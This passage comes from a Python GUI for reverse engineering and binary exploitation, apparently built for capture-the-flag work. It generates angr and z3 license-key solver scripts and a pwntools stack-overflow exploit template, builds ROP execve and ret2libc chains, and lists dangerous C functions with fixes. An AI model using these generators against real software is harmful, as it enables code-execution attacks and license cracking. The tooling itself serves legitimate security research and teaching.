            f"# License key solver for: {os.path.basename(binary)}",
            f"# Validation functions: {repr(checks[:6])}",
            "import subprocess, sys",
            "",
            f"BINARY  = {path}",
            "KEY_LEN = 16",
            "",
            "def test(key: str) -> bool:",
            "    r = subprocess.run([BINARY, key], input=key.encode() + b'\\n',",
            "                       capture_output=True, timeout=3)",
            "    out = (r.stdout + r.stderr).decode(errors='replace').lower()",
            "    return any(w in out for w in ('valid','correct','success','win','flag'))",
            "",
            "try:",
            "    import angr, claripy",
            "    proj = angr.Project(BINARY, auto_load_libs=False)",
            "    key  = claripy.BVS('key', KEY_LEN * 8)",
            "    st   = proj.factory.full_init_state(",
            "        args=[BINARY, claripy.Concat(key, claripy.BVV(b'\\x00'))],",
            "    )",
            "    for b in key.chop(8): st.add_constraints(b >= 0x20, b <= 0x7e)",
            "    sm = proj.factory.simulation_manager(st)",
            "    sm.explore(",
            "        find  = lambda s: any(w in s.posix.dumps(1).lower() for w in (b'valid',b'correct',b'success')),",
            "        avoid = lambda s: any(w in s.posix.dumps(1).lower() for w in (b'invalid',b'wrong',b'fail')),",
            "    )",
            "    if sm.found:",
            "        sol = sm.found[0].solver.eval(key, cast_to=bytes).rstrip(b'\\x00')",
            "        print('[+] angr key:', sol.decode(errors='replace'))",
            "        sys.exit(0)",
            "    else:",
            "        print('[-] angr: no solution')",
            "except ImportError:",
            "    print('[!] pip install angr')",
            "",
            "try:",
            "    import z3",
            "    s    = z3.Solver()",
            "    bits = [z3.BitVec(f'b{i}', 8) for i in range(KEY_LEN)]",
            "    for b in bits: s.add(b >= 0x20, b <= 0x7e)",
            "    # Add extracted constraints from disassembly here",
            "    if s.check() == z3.sat:",
            "        m   = s.model()",
            "        ans = bytes(m[bits[i]].as_long() for i in range(KEY_LEN))",
            "        print('[+] Z3 key:', ans.decode(errors='replace'))",
            "except ImportError:",
            "    print('[!] pip install z3-solver')",
        ]
        return '\n'.join(lines)

    def triton_deobfuscate(self, ch: dict = None) -> str:
        binary = self.loader.path
        path   = repr(binary)
        ep     = hex(self.loader.entry_point)
        lines = [
            "#!/usr/bin/env python3",
            f"# Triton symbolic deobfuscator for: {os.path.basename(binary)}",
            "# pip install triton-library",
            "from triton import TritonContext, ARCH, MODE, MemoryAccess, CPUSIZE",
            "import lief, sys",
            "",
            f"binary = lief.parse({path})",
            "ctx    = TritonContext()",
            "ctx.setArchitecture(ARCH.X86_64)",
            "ctx.setMode(MODE.ALIGNED_MEMORY, True)",
            "ctx.setMode(MODE.AST_OPTIMIZATIONS, True)",
            "",
            "for seg in binary.segments:",
            "    if seg.type == lief.ELF.Segment.TYPE.LOAD:",
            "        ctx.setConcreteMemoryAreaValue(seg.virtual_address, list(seg.content))",
            "",
            "INPUT_ADDR = 0x0   # TODO: address of input buffer (use Disassembly panel)",
            "INPUT_LEN  = 32    # expected flag/key length",
            f"TARGET     = {ep}  # TODO: address of success branch (use CFG panel)",
            "",
            "for i in range(INPUT_LEN):",
            "    ctx.symbolizeMemory(MemoryAccess(INPUT_ADDR + i, CPUSIZE.BYTE))",
            "",
            "from capstone import Cs, CS_ARCH_X86, CS_MODE_64",
            "entry_seg = next((s for s in binary.segments",
            f"                  if s.virtual_address <= {ep} < s.virtual_address + s.virtual_size), None)",
            "if not entry_seg: sys.exit('segment not found')",
            "",
            "code   = bytes(entry_seg.content)",
            f"offset = {ep} - entry_seg.virtual_address",
            "md     = Cs(CS_ARCH_X86, CS_MODE_64)",
            "",
            f"for insn in md.disasm(code[offset:], {ep}):",
            "    inst = ctx.getInstruction()",
            "    inst.setAddress(insn.address)",
            "    inst.setOpcode(bytes(insn.bytes))",
            "    if not ctx.processing(inst):",
            "        print(f'stopped @ {hex(insn.address)}'); break",
            "    if insn.address == TARGET: break",
            "",
            "pcs   = ctx.getPathConstraints()",
            "ast   = ctx.getAstContext()",
            "taken = ast.land([pc.getTakenPredicate() for pc in pcs if pc.isMultipleBranches()])",
            "model = ctx.getModel(taken)",
            "if model:",
            "    result = bytes(model[i].getValue() for i in range(INPUT_LEN))",
            "    print('[+]', result.decode(errors='replace'))",
            "else:",
            "    print('[-] no model — check INPUT_ADDR / TARGET')",
        ]
        return '\n'.join(lines)

    def run_angr(self, on_output) -> None:
        if not HAS_ANGR:
            on_output('[-] angr not installed. pip install angr')
            return
        script = self.angr_find_flag()
        exec_globals = {'__name__': '__main__'}
        old_stdout = sys.stdout
        sys.stdout = io.StringIO()
        try:
            exec(compile(script, '<angr_solver>', 'exec'), exec_globals)
            out = sys.stdout.getvalue()
        except Exception as e:
            out = f'Error: {e}\n{traceback.format_exc()}'
        finally:
            sys.stdout = old_stdout
        on_output(out)



# ══════════════════════════════════════════════════════════════════════
# Vulnerability pattern database (for quick triage)
# ══════════════════════════════════════════════════════════════════════
VULN_PATTERNS = {
    'gets':       ('CRITICAL','Unbounded stack write','Use fgets(buf, sz, stdin)'),
    'strcpy':     ('HIGH',   'Unbounded string copy','Use strncpy or strlcpy'),
    'strcat':     ('HIGH',   'Unbounded string concat','Use strncat'),
    'sprintf':    ('HIGH',   'Unbounded format write','Use snprintf'),
    'scanf':      ('HIGH',   'Unbounded input','Use %255s width limiter'),
    'vsprintf':   ('HIGH',   'Unbounded format write','Use vsnprintf'),
    'printf':     ('MEDIUM', 'Potential format string','Ensure no user-controlled format arg'),
    'system':     ('HIGH',   'Shell injection risk','Avoid; use execve with fixed args'),
    'popen':      ('HIGH',   'Shell injection risk','Sanitize all arguments'),
    'exec':       ('HIGH',   'Code execution','Validate all arguments strictly'),
    'malloc':     ('LOW',    'Heap allocation','Check for use-after-free / double-free'),
    'free':       ('LOW',    'Heap deallocation','Ensure no double-free or UAF'),
    'memcpy':     ('MEDIUM', 'Unbounded memory copy','Always validate size parameter'),
    'memmove':    ('MEDIUM', 'Memory overlap','Verify size and pointers'),
    'strtok':     ('LOW',    'Not thread-safe','Use strtok_r'),
    'rand':       ('LOW',    'Weak RNG','Use getrandom() or /dev/urandom'),
    'srand':      ('LOW',    'Predictable seed','Seed from high-entropy source'),
    'setuid':     ('MEDIUM', 'Privilege escalation path','Check return value'),
    'chmod':      ('MEDIUM', 'File permission change','Validate path and mode'),
    'unlink':     ('MEDIUM', 'File deletion','TOCTOU risk — use unlinkat'),
    'read':       ('LOW',    'Check return value','Partial reads possible'),
    'write':      ('LOW',    'Check return value','Partial writes possible'),
    'open':       ('LOW',    'File access','Check for path traversal'),
    'dlopen':     ('MEDIUM', 'Dynamic library load','Validate path; hijacking risk'),
    'signal':     ('LOW',    'Async signal handler','Ensure async-signal-safe functions'),
    'longjmp':    ('MEDIUM', 'Non-local jump','Stack state may be inconsistent'),
    'alloca':     ('MEDIUM', 'Stack allocation — no bounds check','Use malloc for large sizes'),
}

SEVERITY_COLORS = {'CRITICAL':C['red'],'HIGH':C['maroon'],'MEDIUM':C['yellow'],'LOW':C['green']}


# ══════════════════════════════════════════════════════════════════════
# GUI Panels
# ══════════════════════════════════════════════════════════════════════

# ── Binary Info Panel ─────────────────────────────────────────────────
class BinaryInfoPanel(QWidget):
    navigate_to = Signal(int)

    def __init__(self, loader: BinaryLoader, protections: OrderedDict, parent=None):
        super().__init__(parent)
        self.loader = loader
        layout = QVBoxLayout(self)
        layout.setSpacing(6)

        # Title
        title = QLabel(f'📂  {os.path.basename(loader.path)}')
        title.setObjectName('sectionHeader')
        title.setWordWrap(True)
        layout.addWidget(title)

        # File info table
        info_tbl = QTableWidget(0, 2)
        info_tbl.horizontalHeader().setVisible(False); info_tbl.verticalHeader().setVisible(False)
        info_tbl.horizontalHeader().setStretchLastSection(True)
        info_tbl.setMaximumHeight(200)
        rows = [
            ('Path',       loader.path),
            ('Format',     loader.fmt),
            ('Arch',       f'{loader.arch} ({loader.bits}-bit)'),
            ('Entry',      hex(loader.entry_point)),
            ('Size',       f'{loader.file_size:,} bytes'),
        ]
        rows += [(k, v) for k, v in loader.hashes().items()]
        info_tbl.setRowCount(len(rows))
        for i, (k, v) in enumerate(rows):
            ki = QTableWidgetItem(k); ki.setForeground(QColor(C['subtext0']))
            info_tbl.setItem(i, 0, ki); info_tbl.setItem(i, 1, QTableWidgetItem(str(v)))
        info_tbl.resizeColumnsToContents()
        layout.addWidget(info_tbl)

        # Protections
        lbl = QLabel('Security Mitigations'); lbl.setObjectName('sectionHeader')
        layout.addWidget(lbl)
        prot_tbl = QTableWidget(len(protections), 2)
        prot_tbl.setHorizontalHeaderLabels(['Flag', 'Status'])
        prot_tbl.horizontalHeader().setStretchLastSection(True)
        prot_tbl.setMaximumHeight(220)
        prot_tbl.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
        for i, (k, v) in enumerate(protections.items()):
            prot_tbl.setItem(i, 0, QTableWidgetItem(k))
            item = QTableWidgetItem(str(v))
            bad  = ('Disabled', 'None', 'No RELRO', 'Partial RELRO')
            good = ('Enabled', 'Full RELRO', 'Present')
            if any(w in v for w in good):
                item.setForeground(QColor(C['green']))
            elif any(w in v for w in bad):
                item.setForeground(QColor(C['red']))
            else:
                item.setForeground(QColor(C['yellow']))
            prot_tbl.setItem(i, 1, item)
        prot_tbl.resizeColumnsToContents()
        layout.addWidget(prot_tbl)

        # Crypto constants
        crypto = loader.detect_crypto()
        if crypto:
            cl = QLabel('Crypto Constants Detected'); cl.setObjectName('sectionHeader')
            layout.addWidget(cl)
            for name, offset in crypto:
                layout.addWidget(QLabel(f'  🔑 {name}  @ file+{hex(offset)}'))

        # Packer hints
        packers = loader.detect_packer()
        if packers:
            pl = QLabel('Packer / Runtime Detected'); pl.setObjectName('sectionHeader')
            layout.addWidget(pl)
            for p in packers:
                layout.addWidget(QLabel(f'  📦 {p}'))

        layout.addStretch()


# ── Disassembly Panel ─────────────────────────────────────────────────
class DisassemblyPanel(QWidget):
    navigate_to       = Signal(int)
    navigate_to_graph = Signal(int)
    decompile_func    = Signal(int)
    show_xrefs        = Signal(int)

    def __init__(self, loader: BinaryLoader, disasm: Disassembler,
                 comments: CommentsDB, bookmarks: BookmarksDB, xrefs: XRefDB,
                 parent=None):
        super().__init__(parent)
        self.loader = loader; self.disasm = disasm
        self.comments = comments; self.bookmarks = bookmarks; self.xrefs = xrefs
        self.func_map: Dict[int,str] = {}
        self._current_func_addr = 0
        self._insns: List[dict] = []
        layout = QVBoxLayout(self)
        layout.setContentsMargins(0,0,0,0); layout.setSpacing(2)

        # Toolbar
        tb = QHBoxLayout()
        self._func_combo = QComboBox(); self._func_combo.setMinimumWidth(260)
        self._func_combo.currentIndexChanged.connect(self._on_func_selected)
        tb.addWidget(QLabel('Function:')); tb.addWidget(self._func_combo, 1)
        self._search_edit = QLineEdit(); self._search_edit.setPlaceholderText('Search mnemonic / address…')
        self._search_edit.returnPressed.connect(self._search)
        tb.addWidget(self._search_edit)
        btn_search = _btn('search'); btn_search.setMaximumWidth(54)
        btn_search.clicked.connect(self._search)
        tb.addWidget(btn_search)
        btn_cfg = _btn('cfg', 'CFG'); btn_cfg.clicked.connect(lambda: self.navigate_to_graph.emit(self._current_func_addr))
        btn_dec = _btn('decomp', 'Decompile'); btn_dec.clicked.connect(lambda: self.decompile_func.emit(self._current_func_addr))
        tb.addWidget(btn_cfg); tb.addWidget(btn_dec)
        layout.addLayout(tb)

        # Disassembly text
        self._text = QPlainTextEdit(); self._text.setReadOnly(True)
        self._text.setFont(QFont('JetBrains Mono',10))
        self._text.setLineWrapMode(QPlainTextEdit.LineWrapMode.NoWrap)
        self._hl = AsmHighlighter(self._text.document())
        self._text.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self._text.customContextMenuRequested.connect(self._context_menu)
        layout.addWidget(self._text)

        # Status bar
        self._status = QLabel('')
        self._status.setStyleSheet(f'color:{C["subtext0"]};padding:2px 6px;font-size:11px;')
        layout.addWidget(self._status)

    def load_functions(self):
        self._func_combo.blockSignals(True)
        self._func_combo.clear()
        funcs = self.loader.get_functions()
        self.func_map = {a: n for n, a in funcs}
        for name, addr in funcs:
            self._func_combo.addItem(f'{hex(addr):>14}  {name}', userData=addr)
        self._func_combo.blockSignals(False)
        if funcs:
            self._func_combo.setCurrentIndex(0)
            self._load_function(funcs[0][1])

    def _on_func_selected(self, idx):
        addr = self._func_combo.itemData(idx)
        if addr is not None: self._load_function(addr)

    def _load_function(self, addr: int):
        self._current_func_addr = addr
        key = (addr, self.loader.bits)
        if key not in self.loader._insn_cache:
            size = self.loader.get_function_size(addr)
            code = self.loader.read_vaddr(addr, size)
            if code:
                self.loader._insn_cache[key] = self.disasm.disassemble(code, addr)
            else:
                self.loader._insn_cache[key] = []
        self._insns = self.loader._insn_cache[key]
        self.xrefs.build_from_insns(self._insns)
        self._render()
        self._status.setText(f'{len(self._insns)} instructions  @  {hex(addr)}  —  {self.func_map.get(addr,"?")}')

    def _render(self):
        lines = []
        fname = self.func_map.get(self._current_func_addr, hex(self._current_func_addr))
        lines.append('; ─────────────────────────────────────────────')
        lines.append(f'; Function: {fname}  ({hex(self._current_func_addr)})')
        lines.append('; ─────────────────────────────────────────────')
        for insn in self._insns:
            addr = insn['address']; mn = insn['mnemonic']; op = insn['op_str']
            comment = self.comments.get(addr)
            bm = next((l for a, l, _ in self.bookmarks.bookmarks if a == addr), None)
            prefix = '★ ' if bm else '  '
            # Resolve call targets
            ann = ''
            if mn.lower() in ('call','callq'):
                try:
                    t = int(op.strip(), 16)
                    name = self.func_map.get(t, '')
                    if name: ann = f'   ; → {name}'
                except Exception as _e: log.debug(f"Suppressed: {_e}")
            cmt = f'   ; {comment}' if comment else ''
            line = f'{prefix}{hex(addr):>14}:  {insn["bytes"]:>16}  {mn:<10} {op}{ann}{cmt}'
            lines.append(line)
        self._text.setPlainText('\n'.join(lines))

    def navigate_to_addr(self, addr: int):
        """Scroll to nearest instruction at or after addr."""
        for i, insn in enumerate(self._insns):
            if insn['address'] >= addr:
                # Find line in text
                block = self._text.document().findBlockByLineNumber(i + 3)
                cur = self._text.textCursor()
                cur.setPosition(block.position())
                self._text.setTextCursor(cur)
                self._text.ensureCursorVisible()
                return

    def _search(self):
        query = self._search_edit.text().strip()
        if not query: return
        try:
            target_addr = int(query, 16)
            # Check if it's a VA — switch to containing function
            for name, addr in self.loader.get_functions():
                size = self.loader.get_function_size(addr)
                if addr <= target_addr < addr + size:
                    idx = self._func_combo.findData(addr)
                    if idx >= 0: self._func_combo.setCurrentIndex(idx)
                    self.navigate_to_addr(target_addr)
                    return
        except ValueError: pass
        # Text search
        self._text.find(query)

    def _context_menu(self, pos):
        cursor = self._text.cursorForPosition(pos)
        line = cursor.block().text().strip()
        # Try to extract address from line start
        addr = None
        m = re.match(r'[★\s]*0x([0-9a-fA-F]+):', line)
        if m:
            try: addr = int(m.group(1), 16)
            except Exception as _e: log.debug(f"Suppressed: {_e}")

        menu = QMenu(self)
        if addr is not None:
            menu.addAction(f'Comment @ {hex(addr)}…', lambda: self._add_comment(addr))
            menu.addAction(f'Bookmark @ {hex(addr)}', lambda: self._add_bookmark(addr))
            menu.addAction('Rename function…', lambda: self._rename_func(addr))
            menu.addAction(f'XRefs to {hex(addr)}', lambda: self.show_xrefs.emit(addr))
            menu.addSeparator()
            menu.addAction('⎋ Show in CFG', lambda: self.navigate_to_graph.emit(self._current_func_addr))
            menu.addAction('⚙ Decompile function', lambda: self.decompile_func.emit(self._current_func_addr))
            menu.addSeparator()
            # Overflow exploit for dangerous calls
            for vuln, (sev, desc, _) in VULN_PATTERNS.items():
                if vuln in line.lower():
                    menu.addAction(f'💥 Generate {vuln} exploit…',
                                   lambda v=vuln, a=addr: self._gen_overflow(v, a))
        menu.addSeparator()
        menu.addAction('Copy line', lambda: self._copy_line(cursor))
        if not menu.isEmpty(): menu.exec(self._text.mapToGlobal(pos))

    def _add_comment(self, addr):
        cur = self.comments.get(addr)
        text, ok = QInputDialog.getText(self, 'Add Comment', f'Comment @ {hex(addr)}:', text=cur)
        if ok: self.comments.set(addr, text.strip()); self._render()

    def _add_bookmark(self, addr):
        label, ok = QInputDialog.getText(self, 'Bookmark', 'Label:', text=self.func_map.get(addr, hex(addr)))
        if ok: self.bookmarks.add(addr, label)

    def _rename_func(self, addr):
        # Find nearest function
        funcs = sorted(self.loader.get_functions(), key=lambda x: x[1])
        func_addr = addr
        for _, a in reversed(funcs):
            if a <= addr: func_addr = a; break
        cur = self.func_map.get(func_addr, f'sub_{func_addr:x}')
        name, ok = QInputDialog.getText(self, 'Rename Function', f'New name @ {hex(func_addr)}:', text=cur)
        if ok and name:
            self.loader.rename_function(func_addr, name.strip())
            self.load_functions()

    def _gen_overflow(self, vuln: str, addr: int):
        dlg = QDialog(self); dlg.setWindowTitle(f'Overflow Exploit — {vuln}')
        dlg.resize(700, 500)
        lay = QVBoxLayout(dlg)
        te = QPlainTextEdit()
        te.setFont(QFont('JetBrains Mono',9))
        # Basic template
        template = OVERFLOW_TEMPLATE.format(
            binary=self.loader.path, vuln=vuln, addr=hex(addr))
        te.setPlainText(template)
        AsmHighlighter(te.document())
        lay.addWidget(te)
        btn = QPushButton('Copy to clipboard')
        btn.clicked.connect(lambda: QApplication.clipboard().setText(te.toPlainText()))
        lay.addWidget(btn)
        dlg.exec()

    def _copy_line(self, cursor):
        QApplication.clipboard().setText(cursor.block().text())


OVERFLOW_TEMPLATE = """\
#!/usr/bin/env python3
# Auto-generated overflow exploit
# Vulnerable call: {vuln} @ {addr}
from pwn import *

BINARY = {binary!r}
elf    = ELF(BINARY, checksec=False)
context.binary = elf
context.log_level = 'warning'

io = process(BINARY)

OFFSET = 64  # TODO: verify — cyclic 200, crash, cyclic_find(<ret_addr>)

# Payload skeleton (edit before running)
payload  = cyclic(OFFSET)
payload += p64(elf.sym.get('win', 0))   # replace with your target/ROP chain

io.sendlineafter(b'> ', payload)
print('[*] Output:', io.recvall(timeout=3))
io.close()
# NOTE: run this script from a terminal for interactive use.
# Replace recvall() with io.interactive() once payload is confirmed.
"""



# ── CFG Panel ─────────────────────────────────────────────────────────
class CFGPanel(QWidget):
    navigate_to = Signal(int)

    def __init__(self, loader: BinaryLoader, disasm: Disassembler, parent=None):
        super().__init__(parent)
        self.loader = loader; self.disasm = disasm
        self._cache: Dict[Tuple, Dict[int,BasicBlock]] = {}
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0); layout.setSpacing(2)

        tb = QHBoxLayout()
        self._func_combo = QComboBox(); self._func_combo.setMinimumWidth(260)
        self._func_combo.currentIndexChanged.connect(self._on_func_selected)
        tb.addWidget(QLabel('Function:')); tb.addWidget(self._func_combo, 1)
        self._horiz_cb = QCheckBox('Horizontal layout')
        self._horiz_cb.stateChanged.connect(lambda _: self._refresh())
        tb.addWidget(self._horiz_cb)
        btn_fit = _btn('fit', 'Fit'); btn_fit.setMaximumWidth(70)
        btn_fit.clicked.connect(lambda: self._view.fitInView(
            self._view._scene.sceneRect().adjusted(-20,-20,20,20), Qt.AspectRatioMode.KeepAspectRatio))
        tb.addWidget(btn_fit)
        layout.addLayout(tb)

        self._view = CFGView()
        layout.addWidget(self._view)

    def load_functions(self):
        self._func_combo.blockSignals(True)
        self._func_combo.clear()
        for name, addr in self.loader.get_functions():
            self._func_combo.addItem(f'{hex(addr):>14}  {name}', userData=addr)
        self._func_combo.blockSignals(False)
        funcs = self.loader.get_functions()
        if funcs: self._load_function(funcs[0][1])

    def focus_addr(self, addr: int):
        """Find and load the function containing addr."""
        funcs = sorted(self.loader.get_functions(), key=lambda x: x[1])
        for i, (_, a) in enumerate(funcs):
            nxt = funcs[i+1][1] if i+1 < len(funcs) else a+0x2000
            if a <= addr < nxt:
                idx = self._func_combo.findData(a)
                if idx >= 0: self._func_combo.setCurrentIndex(idx)
                return

    def _on_func_selected(self, idx):
        addr = self._func_combo.itemData(idx)
        if addr is not None: self._load_function(addr)

    def _load_function(self, addr: int):
        self._current_addr = addr
        self._refresh()

    def _refresh(self):
        addr = getattr(self, '_current_addr', None)
        if addr is None: return
        horiz = self._horiz_cb.isChecked()
        key = (addr, horiz)
        if key not in self._cache:
            size = self.loader.get_function_size(addr)
            code = self.loader.read_vaddr(addr, size)
            if not code: self._view.load_cfg({}, addr, {}); return
            insns = self.disasm.disassemble(code, addr)
            blocks = self.disasm.build_cfg(insns)
            self.disasm.layout_cfg(blocks, addr, horizontal=horiz)
            self._cache[key] = blocks
        blocks = self._cache[key]
        func_map = {a:n for n,a in self.loader.get_functions()}
        self._view.load_cfg(blocks, addr, func_map)


# ── Decompiler Panel ──────────────────────────────────────────────────
class DecompilerPanel(QWidget):
    def __init__(self, loader: BinaryLoader, decompiler: PseudoDecompiler, parent=None):
        super().__init__(parent)
        self.loader = loader; self.decompiler = decompiler
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0); layout.setSpacing(2)

        tb = QHBoxLayout()
        self._func_combo = QComboBox(); self._func_combo.setMinimumWidth(260)
        self._func_combo.currentIndexChanged.connect(self._on_func_selected)
        tb.addWidget(QLabel('Function:')); tb.addWidget(self._func_combo, 1)
        btn_dec = _btn('decomp', 'Decompile'); btn_dec.setObjectName('accent')
        btn_dec.clicked.connect(self._decompile_current)
        tb.addWidget(btn_dec)
        layout.addLayout(tb)

        self._text = QPlainTextEdit(); self._text.setReadOnly(True)
        self._text.setFont(QFont('JetBrains Mono', 10))
        self._hl = CHighlighter(self._text.document())
        layout.addWidget(self._text)

    def load_functions(self):
        self._func_combo.blockSignals(True)
        self._func_combo.clear()
        for name, addr in self.loader.get_functions():
            self._func_combo.addItem(f'{hex(addr):>14}  {name}', userData=addr)
        self._func_combo.blockSignals(False)
        funcs = self.loader.get_functions()
        if funcs: self._on_func_selected(0)

    def decompile_addr(self, addr: int):
        idx = self._func_combo.findData(addr)
        if idx >= 0: self._func_combo.setCurrentIndex(idx)
        self._decompile_current()

    def _on_func_selected(self, idx):
        pass  # manual decompile only

    def _decompile_current(self):
        addr = self._func_combo.currentData()
        if addr is None: return
        size = self.loader.get_function_size(addr)
        self._text.setPlainText('/* Decompiling… */')
        w = Worker(self.decompiler.decompile, addr, size)
        w.result.connect(self._text.setPlainText)
        w.error.connect(lambda e: self._text.setPlainText(f'/* Error: {e} */'))
        w.finished.connect(lambda: w.deleteLater())
        w.start(); self._workers = getattr(self, '_workers', []); self._workers.append(w)


# ── ExROP Panel ───────────────────────────────────────────────────────
class ExROPPanel(QWidget):
    def __init__(self, loader: BinaryLoader, rop_engine: ROPEngine, solver: SolverCore, parent=None):
        super().__init__(parent)
        self.loader = loader; self.rop = rop_engine; self.solver = solver
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0); layout.setSpacing(4)

        # Toolbar
        tb = QHBoxLayout()
        self._scan_btn = _btn('scan', 'Scan Gadgets'); self._scan_btn.setObjectName('accent')
        self._scan_btn.clicked.connect(self._scan)
        self._cancel_btn = _btn('cancel', 'Cancel'); self._cancel_btn.setObjectName('danger')
        self._cancel_btn.setEnabled(False); self._cancel_btn.clicked.connect(self._cancel_scan)
        tb.addWidget(self._scan_btn); tb.addWidget(self._cancel_btn)
        self._progress = QProgressBar(); self._progress.setMaximumWidth(200); self._progress.setRange(0,100)
        tb.addWidget(self._progress)
        self._count_lbl = QLabel('No gadgets'); tb.addWidget(self._count_lbl); tb.addStretch()
        layout.addLayout(tb)

        # Search
        s = QHBoxLayout()
        self._query = QLineEdit(); self._query.setPlaceholderText('Regex / mnemonic (e.g. pop rdi; ret)…')
        self._query.returnPressed.connect(self._search)
        self._cls_combo = QComboBox()
        self._cls_combo.addItem('All classes'); 
        for cls in ROPGadget.CLASSES: self._cls_combo.addItem(cls)
        self._cls_combo.currentIndexChanged.connect(self._search)
        btn_s = QPushButton('Search'); btn_s.clicked.connect(self._search)
        s.addWidget(QLabel('Filter:'), 0); s.addWidget(self._query, 2)
        s.addWidget(QLabel('Class:'), 0); s.addWidget(self._cls_combo, 1); s.addWidget(btn_s)
        layout.addLayout(s)

        # Semantic classes tree + gadget list splitter
        splitter = QSplitter(Qt.Orientation.Horizontal)
        self._cls_tree = QTreeWidget()
        self._cls_tree.setHeaderLabel('Semantic Classes')
        self._cls_tree.itemClicked.connect(self._on_cls_clicked)
        self._cls_tree.setMaximumWidth(220)

        right = QWidget(); rl = QVBoxLayout(right); rl.setContentsMargins(0,0,0,0)
        self._gadget_list = QTableWidget(0, 3)
        self._gadget_list.setHorizontalHeaderLabels(['Address','Gadget','Classes'])
        self._gadget_list.horizontalHeader().setSectionResizeMode(1, QHeaderView.ResizeMode.Stretch)
        self._gadget_list.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self._gadget_list.doubleClicked.connect(self._on_gadget_dbl)
        rl.addWidget(self._gadget_list)

        # Chain builder
        rl.addWidget(QLabel('Chain Builder'))
        chain_tb = QHBoxLayout()
        btn_execve = _btn('chain', 'execve Chain')
        btn_execve.clicked.connect(self._build_execve)
        btn_ret2libc = _btn('chain', 'ret2libc Chain')
        btn_ret2libc.clicked.connect(self._build_ret2libc)
        chain_tb.addWidget(btn_execve); chain_tb.addWidget(btn_ret2libc); chain_tb.addStretch()
        rl.addLayout(chain_tb)
        self._chain_out = QPlainTextEdit(); self._chain_out.setReadOnly(True)
        self._chain_out.setMaximumHeight(200)
        self._chain_out.setFont(QFont('JetBrains Mono',9))
        rl.addWidget(self._chain_out)

        splitter.addWidget(self._cls_tree); splitter.addWidget(right)
        splitter.setSizes([220, 600])
        layout.addWidget(splitter)

    def _scan(self):
        self._scan_btn.setEnabled(False)
        self._cancel_btn.setEnabled(True)
        self._progress.setValue(0)
        self._cancel_flag = [False]

        def _do_scan():
            return self.rop.scan(
                progress_cb=lambda p, msg: None,  # progress emitted via signal below
                cancel_flag=self._cancel_flag,
            )

        w = Worker(_do_scan)
        w.result.connect(self._on_scan_done)
        w.error.connect(lambda e: (self._count_lbl.setText(f'Error: {e}'),
                                   self._scan_btn.setEnabled(True),
                                   self._cancel_btn.setEnabled(False)))
        # Pulse progress bar while scanning
        self._scan_timer = QTimer(self)
        self._scan_timer.timeout.connect(lambda: self._progress.setValue(
            (self._progress.value() + 3) % 100))
        self._scan_timer.start(80)
        w.finished.connect(self._scan_timer.stop)
        w.finished.connect(lambda: w.deleteLater())
        w.start(); self._scan_worker = w

    def _cancel_scan(self):
        if hasattr(self, '_cancel_flag'): self._cancel_flag[0] = True
        self._cancel_btn.setEnabled(False)
        self._count_lbl.setText('Cancelled')

    def _on_scan_done(self, count):
        self._scan_btn.setEnabled(True)
        self._cancel_btn.setEnabled(False)
        self._progress.setValue(100)
        self._count_lbl.setText(f'{count:,} gadgets found'
                                 + (f'  (truncated to {ROPEngine.MAX_SCAN_BYTES//1024}KB)'
                                    if self.loader.file_size > ROPEngine.MAX_SCAN_BYTES else ''))
        self._populate_cls_tree()
        self._populate_gadget_table(self.rop.gadgets[:1000])

    def _populate_cls_tree(self):
        self._cls_tree.clear()
        for cls, gs in sorted(self.rop._by_class.items(), key=lambda x: -len(x[1])):
            item = QTreeWidgetItem([f'{cls}  ({len(gs)})'])
            item.setData(0, Qt.ItemDataRole.UserRole, cls)
            self._cls_tree.addTopLevelItem(item)

    def _on_cls_clicked(self, item, col):
        cls = item.data(0, Qt.ItemDataRole.UserRole)
        gs = self.rop.get_class(cls) if cls else self.rop.gadgets
        self._populate_gadget_table(gs[:500])

    def _search(self):
        query = self._query.text().strip()
        cls_text = self._cls_combo.currentText()
        cls = cls_text if cls_text != 'All classes' else ''
        results = self.rop.search(query, cls)
        self._populate_gadget_table(results)
        self._count_lbl.setText(f'{len(results)} results')

    def _populate_gadget_table(self, gadgets: List[ROPGadget]):
        self._gadget_list.setRowCount(0)
        self._gadget_list.setRowCount(len(gadgets))
        for i, g in enumerate(gadgets):
            self._gadget_list.setItem(i, 0, QTableWidgetItem(hex(g.addr)))
            self._gadget_list.setItem(i, 1, QTableWidgetItem(g.text))
            self._gadget_list.setItem(i, 2, QTableWidgetItem(', '.join(g.classes)))

    def _on_gadget_dbl(self, idx):
        addr_item = self._gadget_list.item(idx.row(), 0)
        if addr_item:
            try: addr = int(addr_item.text(), 16)
            except Exception: return
            QApplication.clipboard().setText(hex(addr))

    def _build_execve(self):
        idx = bytes(self.loader._raw).find(b'/bin/sh\x00')
        bin_sh = 0
        if idx >= 0:
            # Map the file offset of "/bin/sh" back to a virtual address
            for sec in (self.loader.get_sections()):
                if sec['offset'] <= idx < sec['offset'] + sec['size']:
                    bin_sh = sec['vaddr'] + (idx - sec['offset']); break
        chain = self.rop.build_execve_chain(bin_sh)
        self._chain_out.setPlainText(chain)

    def _build_ret2libc(self):
        plt_system = plt_exit = 0
        # Try to get PLT addresses from lief
        if self.loader._lief_bin:
            try:
                for sym in self.loader._lief_bin.imported_functions:
                    if sym.name == 'system': plt_system = sym.address
                    if sym.name == 'exit': plt_exit = sym.address
            except Exception as _e: log.debug(f"Suppressed: {_e}")
        idx = bytes(self.loader._raw).find(b'/bin/sh\x00')
        bin_sh = 0
        if idx >= 0:
            for sec in self.loader.get_sections():
                if sec['offset'] <= idx < sec['offset'] + sec['size']:
                    bin_sh = sec['vaddr'] + (idx - sec['offset']); break
        chain = self.rop.build_ret2libc_chain(plt_system, plt_exit, bin_sh)
        self._chain_out.setPlainText(chain)


# ── Triton Symbolic Execution Panel ──────────────────────────────────
class TritonPanel(QWidget):
    def __init__(self, loader: BinaryLoader, parent=None):
        super().__init__(parent)
        self.loader = loader
        self._ctx = None
        layout = QVBoxLayout(self); layout.setContentsMargins(0,0,0,0)

        if not HAS_TRITON:
            lbl = QLabel(
                '<b>Triton symbolic execution engine — not installed</b><br><br>'
                'Install with:<br>'
                '<code>&nbsp;&nbsp;pip install triton-library</code><br><br>'
                'Or build from source (Ubuntu):<br>'
